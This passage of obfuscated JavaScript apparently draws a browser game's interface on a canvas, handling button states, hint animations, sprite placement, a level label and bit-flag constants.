					else if (this.ᐃᐃⵠᐃᐃⲆⵠ === this.ⲆΔᐃⲆⵠΔⵠ) this.buttons[this.ᐃᐃⵠᐃᐃⲆⵠ].info.state = ᐃΔⵠⵠ;
					else if (this.ΔⵠΔⲆᐃΔⵠ === this.ⲆΔᐃⲆⵠΔⵠ) this.buttons[this.ΔⵠΔⲆᐃΔⵠ].info.state = ᐃΔⵠⵠ
				}
				if (Ⲇⵠᐃⵠᐃ === (this.ⲆⲆⲆⲆⵠ & Ⲇⵠᐃⵠᐃ)) {
					if (-1 === this.ⵠⲆΔⲆΔⲆⵠ) this.buttons[ᐃᐃΔⲆΔⲆᐃᐃᐃ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ === this.ⵠⲆΔⲆΔⲆⵠ) this.buttons[ⲆⲆΔⵠⲆᐃⲆⵠⲆ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ === this.ⵠⲆΔⲆΔⲆⵠ) this.buttons[ᐃⲆᐃⲆⲆᐃΔΔⲆ].info.state = ᐃΔⵠⵠ;
					else if (this.ⵠⲆΔⲆΔⲆⵠ === ΔᐃᐃΔ.ⲆⵠΔⵠᐃ) this.buttons[ⵠⲆⲆᐃⲆⵠⵠᐃΔ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ === this.ⵠⲆΔⲆΔⲆⵠ) this.buttons[ⵠΔⲆᐃᐃΔⵠⵠᐃ].info.state = ᐃΔⵠⵠ;
					if (this.ⵠⲆᐃⲆΔⵠᐃ === 0) this.buttons[ΔⵠᐃⲆⵠᐃⵠⵠⵠ].info.state = ᐃΔⵠⵠ;
					else if (ⵠΔⵠΔ === this.ⵠⲆᐃⲆΔⵠᐃ) this.buttons[ⲆⵠⵠⵠⵠΔⲆⵠΔ].info.state = ᐃΔⵠⵠ;
					else if (2 === this.ⵠⲆᐃⲆΔⵠᐃ) this.buttons[ⵠⲆΔᐃΔⵠⵠᐃΔ].info.state = ᐃΔⵠⵠ;
					else if (this.ⵠⲆᐃⲆΔⵠᐃ === 3) this.buttons[ΔΔΔᐃⵠΔΔⲆⲆ].info.state = ᐃΔⵠⵠ;
					else if (ⵠᐃᐃⲆ === this.ⵠⲆᐃⲆΔⵠᐃ) this.buttons[ᐃⲆΔᐃΔⵠᐃΔⵠ].info.state = ᐃΔⵠⵠ;
					else 5 === this.ⵠⲆᐃⲆΔⵠᐃ && (this.buttons[ΔⲆΔΔᐃᐃΔΔⵠ].info.state = ᐃΔⵠⵠ)
				}
				if ((this.ⲆⲆⲆⲆⵠ & ⲆⵠΔΔΔ) === ⲆⵠΔΔΔ && ΔⵠⲆᐃ.ⲆⵠⵠⲆⵠᐃΔ === 0) {
					if (this.buttons[ⲆᐃΔΔⵠ].ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ)) this.buttons[ⲆᐃΔΔⵠ].hint = Math.min(ᐃᐃⲆΔ, this.buttons[ⲆᐃΔΔⵠ].hint + 1.5 * ᐃⵠᐃᐃ);
					else this.buttons[ⲆᐃΔΔⵠ].hint = Math.max(Δᐃᐃᐃ, this.buttons[ⲆᐃΔΔⵠ].hint - ᐃⵠᐃᐃ * 1.5);
					if (this.buttons[ⵠⲆᐃⲆΔ].ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ)) this.buttons[ⵠⲆᐃⲆΔ].hint = Math.min(1, this.buttons[ⵠⲆᐃⲆΔ].hint + ᐃⵠᐃᐃ * 1.5);
					else this.buttons[ⵠⲆᐃⲆΔ].hint = Math.max(0, this.buttons[ⵠⲆᐃⲆΔ].hint - 1.5 * ᐃⵠᐃᐃ);
					this.buttons[ᐃⲆΔⵠⵠ].ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ) ? this.buttons[ᐃⲆΔⵠⵠ].hint = Math.min(1, this.buttons[ᐃⲆΔⵠⵠ].hint + 1.5 * ᐃⵠᐃᐃ) : this.buttons[ᐃⲆΔⵠⵠ].hint = Math.max(0, this.buttons[ᐃⲆΔⵠⵠ].hint - 1.5 * ᐃⵠᐃᐃ);
					if (this.buttons[ⵠⵠⲆⲆⲆ].ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ)) this.buttons[ⵠⵠⲆⲆⲆ].hint = Math.min(1, this.buttons[ⵠⵠⲆⲆⲆ].hint + 1.5 * ᐃⵠᐃᐃ);
					else this.buttons[ⵠⵠⲆⲆⲆ].hint = Math.max(0, this.buttons[ⵠⵠⲆⲆⲆ].hint - ᐃⵠᐃᐃ * 1.5);
					this.buttons[ᐃⲆⵠΔᐃ].ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ) ? this.buttons[ᐃⲆⵠΔᐃ].hint = Math.min(ⵠΔΔ, this.buttons[ᐃⲆⵠΔᐃ].hint + 1.5 * ᐃⵠᐃᐃ) : this.buttons[ᐃⲆⵠΔᐃ].hint = Math.max(ΔⲆⵠⲆ, this.buttons[ᐃⲆⵠΔᐃ].hint - ᐃⵠᐃᐃ * 1.5);
					this.buttons[ᐃⵠⲆΔⵠ].ⵠᐃⲆᐃⵠΔΔ(ⲆⲆⵠⵠ.ⵠΔΔᐃ) ? this.buttons[ᐃⵠⲆΔⵠ].hint = Math.min(ΔΔᐃⵠ, this.buttons[ᐃⵠⲆΔⵠ].hint + ᐃⵠᐃᐃ * 1.5) : this.buttons[ᐃⵠⲆΔⵠ].hint = Math.max(0, this.buttons[ᐃⵠⲆΔⵠ].hint - ᐃⵠᐃᐃ * 1.5)
				}
				var ⵠᐃᐃᐃᐃΔΔ = 1;
				if (1 < (this.ⲆⲆⲆⲆⵠ & (ΔᐃⲆᐃΔᐃⵠ | ⵠΔΔⵠⵠⵠᐃ | ᐃⵠⵠⲆΔΔΔ | ΔᐃΔΔⲆⲆΔ | ΔⲆΔⲆᐃᐃᐃ | ᐃΔⵠⵠⲆΔᐃ))) {
					var ᐃⵠ = ⲆΔ.ⲆⵠᐃᐃⲆΔⲆ;
					Δ.save();
					Δ.translate(Δᐃⵠᐃ, ΔᐃⲆΔᐃⲆΔⵠᐃ + ᐃⵠ.height / 4);
					if (this.ⵠΔΔΔⵠ === ΔᐃⲆⵠ) {
						this.ᐃΔᐃᐃⲆⲆⲆ += ᐃⵠᐃᐃ / 3;
						ⵠᐃᐃᐃᐃΔΔ = this.ᐃⵠᐃⵠΔⵠⵠ - ᐃΔⲆⲆᐃ / Math.pow(ᐃΔᐃⲆ + this.ᐃΔᐃᐃⲆⲆⲆ, 1 + this.ᐃΔᐃᐃⲆⲆⲆ);
						Δ.rotate(ⵠᐃᐃᐃᐃΔΔ)
					}
					ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / 4, ᐃⵠ.width / 2, ᐃⵠ.height / ΔⵠⵠΔ);
					Δ.restore()
				}
				if (ΔⵠⲆᐃ.ⲆⵠⵠⲆⵠᐃΔ === 0) {
					if (ΔⵠⲆᐃ.ⵠΔⵠⲆΔ === ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ) this.buttons[ⲆᐃΔΔⵠ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ === ΔⵠⲆᐃ.ⵠΔⵠⲆΔ) this.buttons[ⵠⲆᐃⲆΔ].info.state = ᐃΔⵠⵠ;
					else if (ΔⵠⲆᐃ.ⵠΔⵠⲆΔ === ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ) this.buttons[ᐃⲆⵠΔᐃ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ⲆⵠΔⵠᐃ === ΔⵠⲆᐃ.ⵠΔⵠⲆΔ) this.buttons[ᐃⵠⲆΔⵠ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ᐃⲆΔⵠⵠ === ΔⵠⲆᐃ.ⵠΔⵠⲆΔ) this.buttons[ᐃⲆΔⵠⵠ].info.state = ᐃΔⵠⵠ;
					else if (ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ === ΔⵠⲆᐃ.ⵠΔⵠⲆΔ) this.buttons[ⵠⵠⲆⲆⲆ].info.state = ᐃΔⵠⵠ
				}
				for (var ⵠᐃ = 1; this.buttons.length > ⵠᐃ; ⵠᐃ++) {
					if (this.buttons[ⵠᐃ].info.active === ⵠⵠᐃΔ) this.buttons[ⵠᐃ].ΔᐃΔⵠ(Δ)
				}
				this.ⵠⵠⲆᐃ[Ⲇᐃⵠⵠ].ΔᐃΔⵠ(Δ);
				if (ⵠⲆⲆ < (this.ⲆⲆⲆⲆⵠ & (ⲆⵠᐃⲆⲆⲆᐃ | ⲆⲆⲆΔᐃⲆⲆ))) {
					var ᐃⵠ = this.ⵠⵠⵠⲆⵠⵠⵠ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / Ⲇᐃⵠᐃ, 138, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
				}
				var ᐃⵠΔⵠᐃ = Math.max(1, Math.min(18, Math.floor((ⵠⲆᐃΔ.ᐃⵠΔⵠᐃ + ⲆΔⵠⵠ) / Δᐃⵠⵠ)));
				this.ⵠⵠⲆᐃ[ᐃⵠΔⵠᐃ].active = ⵠⵠᐃΔ;
				this.ⵠⵠⲆᐃ[ᐃⵠΔⵠᐃ].ΔᐃΔⵠ(Δ);
				this.ⵠⵠⲆᐃ[ᐃⵠΔⵠᐃ].active = ⲆᐃⲆⲆ;
				this.buttons[ⲆⲆⲆᐃ].ΔᐃΔⵠ(Δ);
				if ((this.ⲆⲆⲆⲆⵠ & (ⲆΔⵠⵠΔ | ⲆⵠΔⲆⵠ | ᐃⲆΔⲆΔ | ᐃΔⵠΔⵠ | ᐃΔⵠᐃⲆ)) > Ⲇᐃⵠ) {
					var ᐃΔⵠᐃᐃ = (this.ⲆⲆⲆⲆⵠ & (ⲆⵠΔⲆⵠ | ᐃⲆΔⲆΔ | ᐃΔⵠΔⵠ | ᐃΔⵠᐃⲆ)) > ⵠΔⲆ ? -190 : ΔⲆⲆ;
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠ][this.ΔⵠΔᐃⲆ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⲆⲆⲆΔ + ᐃΔⵠᐃᐃ, 183, ᐃⵠ.width / 2, ᐃⵠ.height / ΔⵠᐃⲆ);
					this.ᐃΔⲆⲆ = (this.ᐃΔⲆⲆ + 1e3 * ᐃⵠᐃᐃ) % 2e3;
					var ΔᐃΔ = (this.ᐃΔⲆⲆ < 1e3) * 4.5 ? this.ᐃΔⲆⲆ / 1e3 : (2e3 - this.ᐃΔⲆⲆ) / 1e3;
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆⵠⲆ][this.ⵠⲆᐃⵠⵠ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / 4 - 62 + ΔᐃΔ + ᐃΔⵠᐃᐃ, 240, ᐃⵠ.width / ⲆⲆΔᐃ, ᐃⵠ.height / 2);
					var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃ][this.ⲆⵠⲆᐃ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⲆᐃᐃΔ - 54 + ΔᐃΔ + ᐃΔⵠᐃᐃ, 272, ᐃⵠ.width / ⵠΔⲆᐃ, ᐃⵠ.height / 2);
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ΔⲆⲆⲆ + 54 - ΔᐃΔ + ᐃΔⵠᐃᐃ, 272, ᐃⵠ.width / 2, ᐃⵠ.height / ᐃⲆΔⲆ);
					var ᐃⵠ = ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃ][this.ⲆⵠⲆᐃ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / 4 + ᐃΔⵠᐃᐃ, 222, ᐃⵠ.width / 2, ᐃⵠ.height / 2);
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆᐃᐃᐃ][this.Δᐃᐃⵠᐃ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⵠΔΔᐃΔ + ᐃΔⵠᐃᐃ, 222, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
				}
				if (ⲆΔⵠⵠΔ === (this.ⲆⲆⲆⲆⵠ & ⲆΔⵠⵠΔ)) {
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃ][this.ⲆᐃⲆⲆᐃ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⵠⲆⵠᐃ - 61, 406 - ᐃⵠ.height / 4, ᐃⵠ.width / ⵠΔⲆᐃ, ᐃⵠ.height / 2);
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃ][this.ᐃⲆⵠΔⵠ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⲆⵠᐃⲆ + 53, 406 - ᐃⵠ.height / 4, ᐃⵠ.width / ⵠΔⲆᐃ, ᐃⵠ.height / Ⲇⵠⵠᐃ)
				}
				if ((this.ⲆⲆⲆⲆⵠ & ᐃᐃⵠⲆⵠ) === ᐃᐃⵠⲆⵠ) {
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃ][this.ᐃⲆⵠΔⵠ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⲆΔⵠᐃ - 200, 268 - ᐃⵠ.height / 4, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
				}
				if ((this.ⲆⲆⲆⲆⵠ & ⵠᐃΔⲆΔ) === ⵠᐃΔⲆΔ) {
					var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆΔᐃ][this.ⲆᐃⲆⲆᐃ][this.ⲆᐃⲆⲆⵠΔΔ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / 4 - 200, 268 - ᐃⵠ.height / Ⲇⵠⵠⵠ, ᐃⵠ.width / ΔⲆΔΔΔ, ᐃⵠ.height / 2)
				}
				if ((this.ⲆⲆⲆⲆⵠ & (ⲆⵠΔⲆⵠ | ᐃⲆΔⲆΔ | ᐃΔⵠΔⵠ | ᐃΔⵠᐃⲆ | ᐃᐃⵠⲆⵠ | ⵠᐃΔⲆΔ)) > 1) {
					for (var ⵠᐃ = 1; this.buttons.length > ⵠᐃ; ⵠᐃ++) {
						if ((this.buttons[ⵠᐃ].view & this.ⲆⲆⲆⲆⵠ) === 0) continue;
						var ⲆⲆᐃᐃ = this.buttons[ⵠᐃ].info;
						if (ⵠᐃⲆᐃ <= ⲆⲆᐃᐃ.ⲆⲆⵠⲆⵠⲆΔ) {
							var ᐃⵠ = ⲆⲆᐃᐃ.ⵠᐃⵠⲆΔᐃⲆᐃⲆ[ⲆⲆᐃᐃ.ⲆⲆⵠⲆⵠⲆΔ].ᐃΔⲆ;
							ΔⲆΔⵠ(Δ, ᐃⵠ, ⲆⲆᐃᐃ.translate.x - ᐃⵠ.width / ᐃᐃⵠᐃᐃΔΔ + 44.5, ⲆⲆᐃᐃ.translate.y - ᐃⵠ.height / 8 + 45.5, ᐃⵠ.width / ΔΔⵠⵠΔ, ᐃⵠ.height / 4);
							if (ⲆⲆᐃᐃ.ᐃⵠΔΔᐃᐃΔ !== ᐃⲆᐃ) {
								var ᐃⵠ = ⲆΔ.ΔⲆⲆⲆᐃΔⲆ;
								ΔⲆΔⵠ(Δ, ᐃⵠ, ⲆⲆᐃᐃ.translate.x - ᐃⵠ.width / ΔΔⵠⵠΔ + 44.5, ⲆⲆᐃᐃ.translate.y - ᐃⵠ.height / ΔⲆⲆⲆ + 44.5, ᐃⵠ.width / 2, ᐃⵠ.height / ᐃⲆⵠᐃ)
							}
						}
					}
					var ᐃⵠ = this.ᐃΔⵠᐃΔΔΔ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - 312, 375, ᐃⵠ.width / ⲆⵠΔΔ, ᐃⵠ.height / Ⲇⵠⵠᐃ);
					var ᐃⵠ = this.ΔᐃⲆᐃⵠⲆⲆ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - 312, 395, ᐃⵠ.width / ⵠΔⲆᐃ, ᐃⵠ.height / 2)
				}
				this.ᐃᐃⵠⵠᐃ !== this.ⵠⲆΔᐃⵠⲆⲆ && (this.ⵠⲆΔᐃⵠⲆⲆ = this.ᐃᐃⵠⵠᐃ, this.ⲆⵠΔΔⵠΔⲆ = ᐃⲆⲆⲆⲆ("" + this.ᐃᐃⵠⵠᐃ, ⵠ[55], ⵠ[354], 60, 250));
				ΔⲆΔⵠ(Δ, this.ⲆⵠΔΔⵠΔⲆ, this.ⵠⵠⲆᐃ[ⵠΔⲆⵠ].translate.x + 350, ΔⲆᐃᐃⲆ, this.ⲆⵠΔΔⵠΔⲆ.w2, this.ⲆⵠΔΔⵠΔⲆ.ΔΔⵠⲆᐃ);
				this.ᐃⵠΔⵠᐃ !== this.ΔᐃⲆⲆⲆᐃᐃ && (this.ΔᐃⲆⲆⲆᐃᐃ = this.ᐃⵠΔⵠᐃ, this.ΔᐃⲆᐃᐃⲆᐃ = ᐃⲆⲆⲆⲆ("LVL " + (this.ᐃⵠΔⵠᐃ + 1), ⵠ[55], ⵠ[354], 50, 250, ⲆⵠᐃⲆⲆ, 30, 24, ⵠⵠⵠⲆⵠ, ᐃᐃⵠᐃᐃ, undefined, undefined, "#3F3019", ⵠⵠⵠⲆᐃ));
				ΔⲆΔⵠ(Δ, this.ΔᐃⲆᐃᐃⲆᐃ, this.ⵠⵠⲆᐃ[0].translate.x + 94, 0, this.ΔᐃⲆᐃᐃⲆᐃ.w2, this.ΔᐃⲆᐃᐃⲆᐃ.ΔΔⵠⲆᐃ);
				if (0 === ΔⵠⲆᐃ.ⲆⵠⵠⲆⵠᐃΔ) {
					var ⲆⵠΔᐃ = this.buttons[ⲆᐃΔΔⵠ].hint;
					if (ⲆⵠΔᐃ > ⵠΔⲆⵠ) {
						var ᐃⵠ = ⲆΔ.ΔᐃᐃΔⲆⵠⲆ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⵠΔΔᐃΔ, -36 - ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(Ⲇᐃⵠ - ⲆⵠΔᐃ) * ᐃⵠ.height / 2, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
					}
					var ⲆⵠΔᐃ = this.buttons[ⵠⲆᐃⲆΔ].hint;
					if (Δᐃᐃⵠ < ⲆⵠΔᐃ) {
						var ᐃⵠ = ⲆΔ.ⲆᐃⵠΔⲆⲆΔ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ᐃⲆᐃⲆⵠ, -36 - ᐃⵠ.height * ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(1 - ⲆⵠΔᐃ) / 2, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
					}
					var ⲆⵠΔᐃ = this.buttons[ᐃⲆΔⵠⵠ].hint;
					if (ⲆⵠΔᐃ > ΔⲆⲆ) {
						var ᐃⵠ = ⲆΔ.ⲆΔΔⵠⵠⵠⵠ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / 4, -36 - ᐃⵠ.height * ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ΔⵠⲆΔ - ⲆⵠΔᐃ) / Δⵠⵠⵠ, ᐃⵠ.width / 2, ᐃⵠ.height / ⵠⵠΔⲆ)
					}
					var ⲆⵠΔᐃ = this.buttons[ⵠⵠⲆⲆⲆ].hint;
					if (ⲆⵠΔᐃ > Ⲇᐃᐃᐃ) {
						var ᐃⵠ = ⲆΔ.ⲆΔΔⲆΔΔΔ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / 4, -36 - ᐃⵠ.height * ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(1 - ⲆⵠΔᐃ) / 2, ᐃⵠ.width / 2, ᐃⵠ.height / 2)
					}
					var ⲆⵠΔᐃ = this.buttons[ᐃⵠⲆΔⵠ].hint;
					if (ⲆⵠΔᐃ > 0) {
						var ᐃⵠ = ⲆΔ.ⲆⵠⲆΔᐃᐃⲆ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⲆΔⵠᐃ, -36 - ᐃⵠ.height * ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(1 - ⲆⵠΔᐃ) / 2, ᐃⵠ.width / 2, ᐃⵠ.height / ⵠΔⲆᐃ)
					}
					var ⲆⵠΔᐃ = this.buttons[ᐃⲆⵠΔᐃ].hint;
					if (Ⲇᐃⵠⵠ < ⲆⵠΔᐃ) {
						var ᐃⵠ = ⲆΔ.ᐃⲆᐃⲆᐃᐃⵠ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⵠⲆⵠᐃ, -36 - ᐃⵠ.height * ΔΔⲆᐃ.ⲆΔⵠⵠᐃ(ⵠᐃⵠΔ - ⲆⵠΔᐃ) / ⵠⵠⵠΔ, ᐃⵠ.width / 2, ᐃⵠ.height / ⵠⵠⵠΔ)
					}
				}
				if (1 === this.ⵠΔΔΔⵠ && Math.abs(ⵠᐃᐃᐃᐃΔΔ - this.ᐃⵠᐃⵠΔⵠⵠ) < .006) {
					Δ.globalAlpha = Math.min(1, ⵠⲆΔⵠΔ * this.ᐃΔⵠⲆⵠΔⵠ);
					var ᐃⵠ = ⲆΔ.ΔᐃⲆᐃⵠᐃⲆ;
					Δ.save();
					Δ.translate(Δᐃⵠᐃ, 260);
					this.ᐃΔⵠⲆⵠΔⵠ += ᐃⵠᐃᐃ;
					Δ.rotate(this.ᐃΔⵠⲆⵠΔⵠ);
					ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / ⲆⲆΔᐃ, -ᐃⵠ.height / 2, ᐃⵠ.width, ᐃⵠ.height);
					Δ.restore();
					var ΔᐃΔ = 1.05 + .05 * Math.cos(this.ᐃΔⵠⲆⵠΔⵠ * 5);
					if (this.ⵠⲆΔⵠⵠⵠⲆ === Δᐃᐃⵠ) {
						ᐃⵠ = ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[this.Δᐃⵠⵠⵠⵠⵠ].ᐃΔⲆ;
						var ᐃⵠⵠ = ΔᐃΔ * ᐃⵠ.width;
						var ⵠⵠᐃ = ᐃⵠ.height * ΔᐃΔ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠⵠ / 2, 260 - ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ)
					} else if (this.ⵠⲆΔⵠⵠⵠⲆ === 1) {
						ᐃⵠ = ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[ᐃΔΔ].ᐃΔⲆ;
						var ᐃⵠⵠ = ΔᐃΔ * ᐃⵠ.width;
						var ⵠⵠᐃ = ΔᐃΔ * ᐃⵠ.height;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠⵠ / ⵠΔⲆᐃ, 260 - ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
						ᐃⵠ = ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ[this.Δᐃⵠⵠⵠⵠⵠ].ᐃΔⲆ;
						var ᐃⵠⵠ = ᐃⵠ.width * ΔᐃΔ;
						var ⵠⵠᐃ = ᐃⵠ.height * ΔᐃΔ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠⵠ / ᐃⲆⵠᐃ, 260 - ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ)
					} else if (this.ⵠⲆΔⵠⵠⵠⲆ === 2) {
						ᐃⵠ = ᐃⲆⵠⲆ.ⵠᐃᐃⵠ[this.Δᐃⵠⵠⵠⵠⵠ].ᐃΔⲆ;
						var ᐃⵠⵠ = ᐃⵠ.width * ΔᐃΔ;
						var ⵠⵠᐃ = ΔᐃΔ * ᐃⵠ.height;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠⵠ / 2, 180 - ⵠⵠᐃ / ⲆΔΔⵠ, ᐃⵠⵠ, ⵠⵠᐃ);
						ᐃⵠ = ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ[Δᐃᐃᐃ].ᐃΔⲆ;
						var ᐃⵠⵠ = ΔᐃΔ * ᐃⵠ.width;
						var ⵠⵠᐃ = ᐃⵠ.height * ΔᐃΔ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠⵠ / 2, 260 - ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ)
					} else if (3 === this.ⵠⲆΔⵠⵠⵠⲆ) {
						ᐃⵠ = ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ[this.Δᐃⵠⵠⵠⵠⵠ].ᐃΔⲆ;
						var ᐃⵠⵠ = ΔᐃΔ * ᐃⵠ.width;
						var ⵠⵠᐃ = ΔᐃΔ * ᐃⵠ.height;
						Δ.save();
						Δ.translate(Δᐃⵠᐃ, 260);
						Δ.rotate(Math.PI);
						ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
						Δ.restore()
					} else if (ⲆΔⵠᐃ === this.ⵠⲆΔⵠⵠⵠⲆ) {
						ᐃⵠ = ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ[this.Δᐃⵠⵠⵠⵠⵠ].ᐃΔⲆ;
						var ᐃⵠⵠ = ΔᐃΔ * ᐃⵠ.width;
						var ⵠⵠᐃ = ᐃⵠ.height * ΔᐃΔ;
						ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠⵠ / 2, 260 - ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ)
					}
					var ᐃⵠ = this.ⲆⵠᐃΔᐃᐃⲆ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ΔⲆᐃⵠᐃ, 340, ᐃⵠ.width / ᐃⲆΔⲆ, ᐃⵠ.height / ⵠΔⲆᐃ);
					var ᐃⵠ = this.ⲆΔᐃⲆΔᐃⲆ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ⲆⵠᐃⲆ, 365, ᐃⵠ.width / 2, ᐃⵠ.height / Ⲇᐃᐃⵠ);
					if (this.ᐃΔⵠⲆⵠΔⵠ > 6) {
						this.ⵠΔΔΔⵠ = 0;
						ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
					}
					Δ.globalAlpha = 1
				}
				ᐃᐃΔ.alert.ΔᐃΔⵠ(ⵠ[253], ⵠ[481]);
				if (ᐃᐃᐃ.waiting) this.ⵠᐃΔⲆⵠᐃᐃ.ΔᐃΔⵠ()
			};
			var ᐃⲆ = 0;
			var ⲆⵠΔΔΔ = Math.pow(2, ᐃⲆ++);
			var Ⲇⵠᐃⵠᐃ = Math.pow(ⲆΔΔⵠ, ᐃⲆ++);
			this.Ⲇⵠᐃⵠᐃ = Ⲇⵠᐃⵠᐃ;
			var ᐃᐃΔᐃⵠ = Math.pow(2, ᐃⲆ++);
			var ⲆΔⵠⵠΔ = Math.pow(ⵠΔⲆᐃ, ᐃⲆ++);
			var ΔᐃⵠⵠΔ = Math.pow(Δᐃⵠⵠ, ᐃⲆ++);
			var ᐃᐃᐃⲆᐃᐃⵠ = Math.pow(2, ᐃⲆ++);
			var ᐃⲆⵠⲆⲆ = Math.pow(2, ᐃⲆ++);
			var ᐃⲆᐃⵠᐃ = Math.pow(2, ᐃⲆ++);
			this.ᐃⲆᐃⵠᐃ = ᐃⲆᐃⵠᐃ;
			var ⵠⵠⵠⲆΔⵠⵠ = Math.pow(ⵠΔⲆᐃ, ᐃⲆ++);
			var ⵠⵠᐃᐃⵠᐃⵠ = Math.pow(2, ᐃⲆ++);
			var ΔᐃⲆᐃΔᐃⵠ = Math.pow(Ⲇⵠⵠᐃ, ᐃⲆ++);
			var ⵠΔΔⵠⵠⵠᐃ = Math.pow(ⲆΔΔⵠ, ᐃⲆ++);
			var ᐃⵠⵠⲆΔΔΔ = Math.pow(2, ᐃⲆ++);
			var ΔᐃΔΔⲆⲆΔ = Math.pow(2, ᐃⲆ++);
